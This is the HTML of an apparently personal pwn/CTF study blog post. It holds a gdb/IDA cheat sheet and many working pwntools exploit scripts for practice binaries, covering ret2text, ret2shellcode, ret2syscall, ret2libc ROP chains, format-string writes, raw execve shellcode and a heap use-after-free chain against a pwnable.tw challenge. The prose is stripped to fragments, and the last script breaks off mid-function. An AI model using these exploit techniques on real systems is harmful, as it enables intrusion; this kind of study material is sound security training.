class=\"comment\">#next step over</span></span><br><span class=\"line\">n </span><br><span class=\"line\"><span class=\"comment\">#step in </span></span><br><span class=\"line\">s  </span><br><span class=\"line\"><span class=\"comment\">#stack</span></span><br><span class=\"line\">stack size</span><br><span class=\"line\">stack 24</span><br><span class=\"line\"><span class=\"comment\">#virtual memory map</span></span><br><span class=\"line\"><span class=\"comment\">#to look rwx segment</span></span><br><span class=\"line\">vmmap</span><br><span class=\"line\"><span class=\"comment\">#plt </span></span><br><span class=\"line\">plt</span><br><span class=\"line\">x p</span><br><span class=\"line\">x/20 p</span><br><span class=\"line\"><span class=\"comment\">#got</span></span><br><span class=\"line\">got</span><br><span class=\"line\"><span class=\"comment\">#chunk</span></span><br><span class=\"line\">fastbin</span><br><span class=\"line\">heap</span><br><span class=\"line\"><span class=\"comment\">#libc</span></span><br><span class=\"line\">b *<span class=\"variable\">$rebase</span>(0x18540)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pause()</span><br><span class=\"line\">attach pid</span><br><span class=\"line\"><span class=\"built_in\">return</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"IDA\"><a href=\"#IDA\" class=\"headerlink\" title=\"IDA\"></a>IDA</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">G  </span><br><span class=\"line\">shift+f12  </span><br><span class=\"line\">shift+E  </span><br><span class=\"line\">n  </span><br></pre></td></tr></table></figure>\n<h2 id=\"ROPgadget\"><a href=\"#ROPgadget\" class=\"headerlink\" title=\"ROPgadget\"></a>ROPgadget</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ROPgadget --binary filename --only &quot;pop|ret&quot;</span><br></pre></td></tr></table></figure>\n<h2 id=\"one-gadget\"><a href=\"#one-gadget\" class=\"headerlink\" title=\"one_gadget\"></a>one_gadget</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">libcbase + one_gadget_address</span><br></pre></td></tr></table></figure>\n<h1 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h1><p></p>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"ret2text-1\"><a href=\"#ret2text-1\" class=\"headerlink\" title=\"ret2text\"></a>ret2text</h3><p>ebp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2text\"</span>)</span><br><span class=\"line\">payload = <span class=\"string\">b'a'</span>*<span class=\"number\">20</span> + p32(<span class=\"number\">0x8048522</span>)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"ret2shellcode-1\"><a href=\"#ret2shellcode-1\" class=\"headerlink\" title=\"ret2shellcode\"></a>ret2shellcode</h3><p>shellcode(bss)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2shellcode\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">buf2 = <span class=\"number\">0x804a080</span></span><br><span class=\"line\"></span><br><span class=\"line\">shellcode = asm(shellcraft.sh()).ljust(<span class=\"number\">112</span>,<span class=\"string\">b'a'</span>)</span><br><span class=\"line\">payload = shellcode + p32(buf2)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"ret2syscall\"><a href=\"#ret2syscall\" class=\"headerlink\" title=\"ret2syscall\"></a>ret2syscall</h3><p>ROPgadget</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2syscall\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">pop_eax = <span class=\"number\">0x80bb196</span></span><br><span class=\"line\">pop_edx = <span class=\"number\">0x806eb90</span></span><br><span class=\"line\">int_80 = <span class=\"number\">0x08049421</span></span><br><span class=\"line\">payload =flat([ <span class=\"string\">b'A'</span>* <span class=\"number\">112</span> , pop_eax , <span class=\"number\">0xb</span> ,pop_edx, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0x80be408</span> ,int_80])</span><br><span class=\"line\"></span><br><span class=\"line\">print(io.recv())</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"ret2libc1\"><a href=\"#ret2libc1\" class=\"headerlink\" title=\"ret2libc1\"></a>ret2libc1</h3><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201107232027030.png\" alt=\"image-20201107232027030\"></p>\n<p>/bin/sh system@plt </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2libc1\"</span>)</span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2libc1\"</span>)</span><br><span class=\"line\">system_plt = elf.plt[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">bin_sh = next(elf.search(<span class=\"string\">b\"/bin/sh\"</span>))</span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x70</span> + p32(system_plt) + <span class=\"string\">b'BBBB'</span> + p32(bin_sh)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"ret2libc2\"><a href=\"#ret2libc2\" class=\"headerlink\" title=\"ret2libc2\"></a>ret2libc2</h3><p> /bin/shbss</p>\n<p></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201112215451308.png\" alt=\"image-20201112215451308\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2libc2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2libc2\"</span>)</span><br><span class=\"line\">system_plt = elf.plt[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">gets_plt = elf.plt[<span class=\"string\">\"gets\"</span>]</span><br><span class=\"line\">bss = <span class=\"number\">0x804a080</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x70</span> + p32(gets_plt) + p32(system_plt) + p32(bss) + p32(bss)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b\"/bin/sh\\x00\"</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<p></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113183137009.png\" alt=\"image-20201113183137009\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2libc2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2libc2\"</span>)</span><br><span class=\"line\">system_plt = elf.plt[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">gets_plt = elf.plt[<span class=\"string\">\"gets\"</span>]</span><br><span class=\"line\">bss = <span class=\"number\">0x804a080</span></span><br><span class=\"line\">pop_ebx_ret = <span class=\"number\">0x804843d</span></span><br><span class=\"line\">payload = <span class=\"string\">b'A'</span>*<span class=\"number\">0x70</span> + p32(gets_plt) + p32(pop_ebx_ret) + p32(bss) + p32(system_plt) + p32(pop_ebx_ret) + p32(bss)</span><br><span class=\"line\">io.sendline(payload)</span><br><span class=\"line\">io.sendline(<span class=\"string\">b\"/bin/bash\\x00\"</span>)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"retlibc3\"><a href=\"#retlibc3\" class=\"headerlink\" title=\"retlibc3\"></a>retlibc3</h3><p></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202023659.png\" alt=\"image-20201113202023659\"></p>\n<p></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201113202640601.png\" alt=\"image-20201113202640601\"></p>\n<p>libc</p>\n<p>libc</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">io = process(<span class=\"string\">\"./ret2libc3\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./ret2libc3\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"libc-2.23.so\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">put = elf.got[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">puts = libc.symbols[<span class=\"string\">\"puts\"</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">\"system\"</span>]</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b\" :\"</span>,str(put))</span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b\" : \"</span>)</span><br><span class=\"line\">libcbase = int(io.recvuntil(<span class=\"string\">b\"\\n\"</span>,drop = <span class=\"literal\">True</span>),<span class=\"number\">16</span>) - puts</span><br><span class=\"line\">payload = flat( cyclic(<span class=\"number\">60</span>), libcbase + system , <span class=\"number\">0xdeadbeef</span> ,next(elf.search(<span class=\"string\">b\"sh\\x00\"</span>)))</span><br><span class=\"line\">io.sendlineafter(<span class=\"string\">b\" :\"</span>,payload)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn2-x64\"><a href=\"#pwn2-x64\" class=\"headerlink\" title=\"pwn2_x64\"></a>pwn2_x64</h3><p></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201116200344612.png\" alt=\"image-20201116200344612\"></p>\n<h3 id=\"pwn3\"><a href=\"#pwn3\" class=\"headerlink\" title=\"pwn3\"></a>pwn3</h3><ol>\n<li>libc1ROP2write</li>\n<li>sh 1sh  2ROP/bin/sh 3libc/bin/sh</li>\n</ol>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">io = process(<span class=\"string\">\"./level3\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/i386-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./level3\"</span>)</span><br><span class=\"line\">vulfun_addr = <span class=\"number\">0x0804844B</span>  </span><br><span class=\"line\">write_plt = elf.symbols[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">write_got = elf.got[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">payload1 = cyclic(<span class=\"number\">0x88</span>+<span class=\"number\">4</span>) + p32(write_plt) + p32(vulfun_addr) + p32(<span class=\"number\">1</span>) + p32(write_got) + p32(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">io.recvuntil(<span class=\"string\">b\"Input:\\n\"</span>)</span><br><span class=\"line\">io.sendline(payload1)</span><br><span class=\"line\"></span><br><span class=\"line\">write_addr = u32(io.recv(<span class=\"number\">4</span>)) <span class=\"comment\">#Specify four bytes</span></span><br><span class=\"line\">libc_base = write_addr - libc.symbols[<span class=\"string\">\"write\"</span>]</span><br><span class=\"line\">system_addr = libc.symbols[<span class=\"string\">\"system\"</span>] + libc_base</span><br><span class=\"line\">sh_addr = libc_base + next(libc.search(<span class=\"string\">b\"/bin/sh\"</span>))</span><br><span class=\"line\"><span class=\"comment\">#libc_write=libc.symbols['write']</span></span><br><span class=\"line\"><span class=\"comment\">#libc_system=libc.symbols['system']</span></span><br><span class=\"line\"><span class=\"comment\">#libc_sh=next(libc.search(b'/bin/sh'))</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#system_addr=write_addr-libc_write+libc_system </span></span><br><span class=\"line\"><span class=\"comment\">#sh_addr=write_addr-libc_write+libc_sh</span></span><br><span class=\"line\">payload2 = cyclic(<span class=\"number\">0x88</span>+<span class=\"number\">4</span>) + p32(system_addr) + <span class=\"string\">b'A'</span>*<span class=\"number\">4</span> + p32(sh_addr)</span><br><span class=\"line\">io.sendline(payload2)</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"pwn3-x64\"><a href=\"#pwn3-x64\" class=\"headerlink\" title=\"pwn3_x64\"></a>pwn3_x64</h3><p>ROP</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174620932.png\" alt=\"image-20201117174620932\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201117174719721.png\" alt=\"image-20201117174719721\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> * </span><br><span class=\"line\"><span class=\"comment\">#context.log_level=\"debug\" </span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">\"level3_x64\"</span>) </span><br><span class=\"line\">write_plt=elf.symbols[<span class=\"string\">\"write\"</span>] </span><br><span class=\"line\">write_got=elf.got[<span class=\"string\">\"write\"</span>] </span><br><span class=\"line\">vul_addr=elf.symbols[<span class=\"string\">'vulnerable_function'</span>]</span><br><span class=\"line\">p = process(<span class=\"string\">\"./level3_x64\"</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=remote(\"47.116.107.8\",9883) </span></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"Input:\\n\"</span>) </span><br><span class=\"line\">pop_rdi_addr=<span class=\"number\">0x00000000004006b3</span>   <span class=\"comment\">#0x00000000004006b3 : pop rdi ; ret</span></span><br><span class=\"line\">pop_rsi_r15_addr=<span class=\"number\">0x00000000004006b1</span>      <span class=\"comment\">#0x00000000004006b1 : pop rsi ; pop r15 ; ret</span></span><br><span class=\"line\">payload1 = cyclic(<span class=\"number\">0x80</span>+<span class=\"number\">8</span>) + p64(pop_rdi_addr) + p64(<span class=\"number\">1</span>) + p64(pop_rsi_r15_addr) + p64(write_got) + p64(<span class=\"string\">'deadbeef'</span>) + p64(write_plt) + p64(vul_addr) </span><br><span class=\"line\">p.sendline(payload1) </span><br><span class=\"line\">t=p.recv(<span class=\"number\">8</span>)</span><br><span class=\"line\">write_addr=u64(t[<span class=\"number\">0</span>:<span class=\"number\">8</span>]) </span><br><span class=\"line\"></span><br><span class=\"line\">libc=ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>) </span><br><span class=\"line\">offset=write_addr-libc.symbols[<span class=\"string\">\"write\"</span>] </span><br><span class=\"line\">sys_addr=offset+libc.symbols[<span class=\"string\">\"system\"</span>] </span><br><span class=\"line\">bin_addr=offset+next(libc.search(<span class=\"string\">b\"/bin/sh\"</span>))</span><br><span class=\"line\">payload2 = cyclic(<span class=\"number\">0x80</span>+<span class=\"number\">8</span>) + p64(pop_rdi_addr) + p64(bin_addr) + p64(sys_addr)</span><br><span class=\"line\">p.sendline(payload2) </span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"fmtstr1\"><a href=\"#fmtstr1\" class=\"headerlink\" title=\"fmtstr1\"></a>fmtstr1</h3><p></p>\n<p>x<code>printf</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"> </span><br><span class=\"line\">conn=process(<span class=\"string\">'./fmtstr1'</span>)</span><br><span class=\"line\">e=ELF(<span class=\"string\">'./fmtstr1'</span>)</span><br><span class=\"line\">x_addr=<span class=\"number\">0x0804A02C</span>                                      </span><br><span class=\"line\">payload=p32(x_addr) + <span class=\"string\">b\"%11$n\"</span></span><br><span class=\"line\">conn.sendline(payload)</span><br><span class=\"line\">conn.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"fmstr2\"><a href=\"#fmstr2\" class=\"headerlink\" title=\"fmstr2\"></a>fmstr2</h3><p> X64  </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%9$s</span><br></pre></td></tr></table></figure>\n<h3 id=\"fmstr-uaf\"><a href=\"#fmstr-uaf\" class=\"headerlink\" title=\"fmstr_uaf\"></a>fmstr_uaf</h3><p>RWXshellcode</p>\n<p>shellcode</p>\n<p>UAF</p>\n<p>shellcode</p>\n<p>fmstrmainrbp</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122165900691.png\" alt=\"image-20201122165900691\"></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">p=process(<span class=\"string\">\"./echo2\"</span>)</span><br><span class=\"line\">elf=ELF(<span class=\"string\">\"./echo2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\"hey, what's your name? : \"</span>)</span><br><span class=\"line\">shellcode=<span class=\"string\">b\"\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\"</span></span><br><span class=\"line\">p.sendline(shellcode)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"&gt; \"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b\"2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">payload=<span class=\"string\">b\"%10$p\"</span>+<span class=\"string\">b\"A\"</span>*<span class=\"number\">3</span></span><br><span class=\"line\">p.sendline(payload)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"0x\"</span>)</span><br><span class=\"line\">shellcode_addr=int(p.recvuntil(<span class=\"string\">b'AAA'</span>,drop=<span class=\"literal\">True</span>),<span class=\"number\">16</span>)<span class=\"number\">-0x20</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"&gt; \"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b\"4\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"to exit? (y/n)\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b\"n\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"&gt; \"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b\"3\"</span>)</span><br><span class=\"line\">p.recvuntil(<span class=\"string\">b\"hello \\n\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">b\"A\"</span>*<span class=\"number\">24</span>+p64(shellcode_addr))</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"-1\"><a href=\"#-1\" class=\"headerlink\" title=\"\"></a></h2><h3 id=\"heap1\"><a href=\"#heap1\" class=\"headerlink\" title=\"heap1\"></a>heap1</h3><p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225712975.png\" alt=\"image-20201122225712975\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122225952773.png\" alt=\"image-20201122225952773\"></p>\n<p>chunk(8byte)freefastbin8bytechunk</p>\n<p>1chunkfastbin</p>\n<p>ptr[1]chunk</p>\n<p>content size8 ptr[0]chunk</p>\n<p>UAF</p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231126664.png\" alt=\"image-20201122231126664\"></p>\n<p><img src=\"/2020/10/24/PWN%E5%AD%A6%E4%B9%A0/image-20201122231528599.png\" alt=\"image-20201122231528599\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(*ptr[v1])(ptr[v1]);</span><br><span class=\"line\">int self_puts(int a1)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  return puts(*(a1 + 4));</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"> </span><br><span class=\"line\">p = remote(<span class=\"string\">\"chall.pwnable.tw\"</span>,<span class=\"number\">10102</span>)</span><br><span class=\"line\"><span class=\"comment\">#p=process(\"./hacknote\")</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./hacknote\"</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"./libc_32.so.6\"</span>)</span><br><span class=\"line\">read_got = elf.got[<span class=\"string\">\"read\"</span>]</span><br><span class=\"line\">pfputs = <span class=\"number\">0x804862b</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add_note</span><span class=\"params\">(size,index)</span>:</span></span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"choice :\"</span>)</span><br><span class=\"line\">      p.sendline(<span class=\"string\">b\"1\"</span>)</span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"size :\"</span>)</span><br><span class=\"line\">      p.sendline(size)</span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"Content :\"</span>)</span><br><span class=\"line\">      p.sendline(index)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">delete_note</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"choice :\"</span>)</span><br><span class=\"line\">      p.sendline(<span class=\"string\">b\"2\"</span>)</span><br><span class=\"line\">      p.recvuntil(<span class=\"string\">b\"Index :\"</span>)</span><br><span class=\"line\">      p.sendline(index)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">print_note</span><span 